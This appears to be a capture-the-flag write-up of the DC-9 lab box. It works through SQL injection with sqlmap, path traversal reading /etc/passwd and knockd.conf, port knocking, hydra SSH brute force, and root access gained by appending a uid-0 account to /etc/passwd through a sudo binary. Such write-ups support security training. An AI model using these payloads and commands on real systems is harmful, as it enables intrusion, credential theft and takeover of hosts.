---
layout: post
author: H4
---

[Details](https://www.vulnhub.com/entry/dc-9,412/)  
This box was customized by Offensive Security and integrated in the 'proving grounds' lab.  
In the following you see the solution of the 'proving grounds' version.  

# discovery

We starting by a port scan to detect the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- 192.168.192.209
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-04 20:15 CEST
Nmap scan report for 192.168.192.209
Host is up (0.033s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 70.04 seconds
```

---

# exploitation
The search feature (`/results.php`) behaves like an `SQL` injection might be possible.
```http
POST /results.php HTTP/1.1
Host: 192.168.192.209
Content-Length: 27
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.192.209
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.192.209/search.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

search=Wilma'+OR+'Betty'--+

HTTP/1.1 200 OK
Date: Fri, 04 Aug 2023 18:17:19 GMT
Server: Apache/2.4.38 (Debian)
Vary: Accept-Encoding
Content-Length: 1168
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
...
ID: 7<br/>Name: Wilma Flintstone<br/>Position: Accounts<br />Phone No: 243457487<br />Email: wilmaf@example.com<br/>
...
```

Lets save the request via `save item` in `burp` and fire `sqlmap` to see if we have something here.
```bash
$ sqlmap --random-agent -r search.request 
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[,]_____ ___ ___  {1.7.2#stable}                                                                                                                                                                                                    
|_ -| . [,]     | .'| . |                                                                                                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:18:30 /2023-08-04/

[20:18:30] [INFO] parsing HTTP request from 'search.request'
[20:18:30] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[20:18:30] [INFO] testing connection to the target URL
[20:18:30] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:18:30] [INFO] testing if the target URL content is stable
[20:18:31] [INFO] target URL content is stable
[20:18:31] [INFO] testing if POST parameter 'search' is dynamic
[20:18:31] [WARNING] POST parameter 'search' does not appear to be dynamic
[20:18:31] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
[20:18:31] [INFO] testing for SQL injection on POST parameter 'search'
[20:18:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:18:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:18:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:18:31] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:18:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:18:32] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:18:32] [INFO] testing 'Generic inline queries'
[20:18:32] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:18:32] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:18:32] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:18:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:18:53] [INFO] POST parameter 'search' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[20:19:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:19:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:19:28] [INFO] target URL appears to be UNION injectable with 6 columns
[20:19:29] [INFO] POST parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=abc' AND (SELECT 5491 FROM (SELECT(SLEEP(5)))toHG) AND 'LFFX'='LFFX

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: search=abc' UNION ALL SELECT NULL,CONCAT(0x71716a7871,0x52774e4a76635768466c5645684955464573574c5863784679717943527676574c4c6473594e5a6b,0x716a787171),NULL,NULL,NULL,NULL-- -
---
[20:19:34] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:19:34] [INFO] fetched data logged to text files under '/home/void/.local/share/sqlmap/output/192.168.192.209'
[20:19:34] [WARNING] your sqlmap version is outdated

[*] ending @ 20:19:34 /2023-08-04/
```

> Yes! We have an `SQL` injection here.
{: .prompt-info }

Digging through the tables shows some `admin` hash.
```bash
$ sqlmap --random-agent -r search.request -D Staff -T Users --dump
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.7.2#stable}                                                                                                                                                                                                    
|_ -| . [(]     | .'| . |                                                                                                                                                                                                                   
|___|_  ["]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
...
Database: Staff
Table: Users
[1 entry]
+--------+----------------------------------+----------+
| UserID | Password                         | Username |
+--------+----------------------------------+----------+
| 1      | 856f5de590ef37314e7c3bdf6f8a66dc | admin    |
+--------+----------------------------------+----------+
...
```

> `admin:856f5de590ef37314e7c3bdf6f8a66dc`
{: .prompt-info }

Checking this hash online at `crackstation.net` reveals the plaintext password.
![image](/images/dc9_hash.png)

> `admin:transorbital1`
{: .prompt-info }

We now can login to the admin interface of the website with these credentials.  
After logging in we see some kind of error on the landing page: `File does not exist`
  
After playing around a bit with different parameters on `/manage.php` we see that using the `get` parameter `file` we are able to read files from the target system.
```http
GET /manage.php?file=../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.192.209
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ve7mlaf7pjbvlr6kpb456sag2j
Connection: close

HTTP/1.1 200 OK
Date: Fri, 04 Aug 2023 18:48:09 GMT
Server: Apache/2.4.38 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 3694
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
...
		<div class="inner">
				File does not exist<br />root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false
marym:x:1001:1001:Mary Moe:/home/marym:/bin/bash
julied:x:1002:1002:Julie Dooley:/home/julied:/bin/bash
fredf:x:1003:1003:Fred Flintstone:/home/fredf:/bin/bash
barneyr:x:1004:1004:Barney Rubble:/home/barneyr:/bin/bash
tomc:x:1005:1005:Tom Cat:/home/tomc:/bin/bash
jerrym:x:1006:1006:Jerry Mouse:/home/jerrym:/bin/bash
wilmaf:x:1007:1007:Wilma Flintstone:/home/wilmaf:/bin/bash
bettyr:x:1008:1008:Betty Rubble:/home/bettyr:/bin/bash
chandlerb:x:1009:1009:Chandler Bing:/home/chandlerb:/bin/bash
joeyt:x:1010:1010:Joey Tribbiani:/home/joeyt:/bin/bash
rachelg:x:1011:1011:Rachel Green:/home/rachelg:/bin/bash
rossg:x:1012:1012:Ross Geller:/home/rossg:/bin/bash
monicag:x:1013:1013:Monica Geller:/home/monicag:/bin/bash
phoebeb:x:1014:1014:Phoebe Buffay:/home/phoebeb:/bin/bash
scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash
janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash
janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
</div>
...
```

> There are a lot users on the system!
{: .prompt-info }

> But we do not see any `ssh` port open.
{: .prompt-danger }

Maybe there is some kind of port knocking in place.
```http
GET /manage.php?file=../../../../../../../../etc/knockd.conf HTTP/1.1
Host: 192.168.192.209
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ve7mlaf7pjbvlr6kpb456sag2j
Connection: close

HTTP/1.1 200 OK
Date: Fri, 04 Aug 2023 18:48:59 GMT
Server: Apache/2.4.38 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1670
Connection: close
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
...
<div class="inner">
				File does not exist<br />[options]
	UseSyslog

[openSSH]
	sequence    = 7469,8475,9842
	seq_timeout = 25
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9842,8475,7469
	seq_timeout = 25
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

</div>
...
```

> To open `ssh` we need to knock the ports `7469`, `8475` and `9842`
{: .prompt-info }

```bash
$ nc 192.168.192.209 7469
(UNKNOWN) [192.168.192.209] 7469 (?) : Connection refused

$ nc 192.168.192.209 8475
(UNKNOWN) [192.168.192.209] 8475 (?) : Connection refused

$ nc 192.168.192.209 9842
(UNKNOWN) [192.168.192.209] 9842 (?) : Connection refused

$ nmap -Pn -p22 192.168.192.209                                             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-04 20:52 CEST
Nmap scan report for 192.168.192.209
Host is up (0.035s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 13.07 seconds
```

> `ssh` is open now!
{: .prompt-info }

When digging through the database we found another user table containing passwords which did not work in the web interface. 
```bash
$ sqlmap --random-agent -r search.request -D users -T UserDetails --dump
...
+----+------------+---------------+---------------------+-----------+-----------+
| id | lastname   | password      | reg_date            | username  | firstname |
+----+------------+---------------+---------------------+-----------+-----------+
| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+----+------------+---------------+---------------------+-----------+-----------+
...
```

Lets try to use `hydra` to brute force `ssh` using these credentials.
```bash
$ hydra -I -V -L usernames.txt -P passwords.txt 192.168.192.209 ssh 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-04 21:00:37
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task
[DATA] attacking ssh://192.168.192.209:22/
...
[22][ssh] host: 192.168.192.209   login: chandlerb   password: UrAG0D!
...
[22][ssh] host: 192.168.192.209   login: joeyt   password: Passw0rd
...
[22][ssh] host: 192.168.192.209   login: janitor   password: Ilovepeepee
...
```

> We found 3 credentials!
{: .prompt-info }

```
chandlerb:UrAG0D!
joeyt:Passw0rd
janitor:Ilovepeepee
```

---

# post exploitation
## get first flag
Going through the accounts via `ssh` reveals some interesting folder in the `home` of `janitor`.
```bash
janitor@dc-9:/home$ cd janitor
janitor@dc-9:~$ ls
janitor@dc-9:~$ ls -lsah
total 12K
4.0K drwx------  3 janitor janitor 4.0K Dec 29  2019 .
4.0K drwxr-xr-x 19 root    root    4.0K Dec 29  2019 ..
   0 lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -> /dev/null
4.0K drwx------  2 janitor janitor 4.0K Dec 29  2019 .secrets-for-putin
janitor@dc-9:~$ cd .secrets-for-putin/
janitor@dc-9:~/.secrets-for-putin$ ls
passwords-found-on-post-it-notes.txt
janitor@dc-9:~/.secrets-for-putin$ ls -lsah
total 12K
4.0K drwx------ 2 janitor janitor 4.0K Dec 29  2019 .
4.0K drwx------ 3 janitor janitor 4.0K Dec 29  2019 ..
4.0K -rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

> We found some new passwords!
{: .prompt-info }

Lets use them via `hydra` to see if we find other valid credentials.
```bash
$ hydra -I -V -L usernames2.txt -P passwords2.txt 192.168.177.209 ssh 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-06 17:30:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 84 login tries (l:14/p:6), ~6 tries per task
[DATA] attacking ssh://192.168.177.209:22/
...
[22][ssh] host: 192.168.177.209   login: fredf   password: B4-Tru3-001
...
```

> Yes! `fredf:B4-Tru3-001`
{: .prompt-info }

Switch to that user and look for the flag.
```bash
janitor@dc-9:/home$ su fredf
Password:
fredf@dc-9:/home$ cd fredf/
fredf@dc-9:~$ ls
local.txt
fredf@dc-9:~$ cat local.txt 
a******************************f
```

## privilege escalation
Checking `sudo` privileges.
```bash
fredf@dc-9:~$ sudo -l
Matching Defaults entries for fredf on dc-9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User fredf may run the following commands on dc-9:
    (root) NOPASSWD: /opt/devstuff/dist/test/test
```

We are able to execute the binary  `/opt/devstuff/dist/test/test` with `sudo` privileges.  
Lets check the `devstuff` folder to see what we have here.
```python
fredf@dc-9:/opt/devstuff$ cat test.py 
#!/usr/bin/python

import sys

if len (sys.argv) != 3 :
    print ("Usage: python test.py read append")
    sys.exit (1)

else :
    f = open(sys.argv[1], "r")
    output = (f.read())

    f = open(sys.argv[2], "a")
    f.write(output)
    f.close()
```

We have the source code of the `test` binary. The binary simply reads the content from one file and appends it to another.  
What we can do here to exploit it is adding a new line to the `/etc/passwd` file to add a new `root` account.  
  
We start by creating the line we will add to `/etc/passwd`.  
```bash
$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```

Save the following line to `/tmp/newuser` on the target system.
```
new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

Add new `root` user.
```bash
fredf@dc-9:/opt/devstuff$ sudo /opt/devstuff/dist/test/test /tmp/newuser /etc/passwd
```

Switch to new user.
```bash
fredf@dc-9:/opt/devstuff$ su new
Password: 
root@dc-9:/opt/devstuff#
```

> Yes we are `root`!
{: .prompt-info }

## get second flag
```bash
root@dc-9:/opt/devstuff# cd /root/
root@dc-9:~# cat proof.txt 
e******************************4
```

Pwned! <@:-)
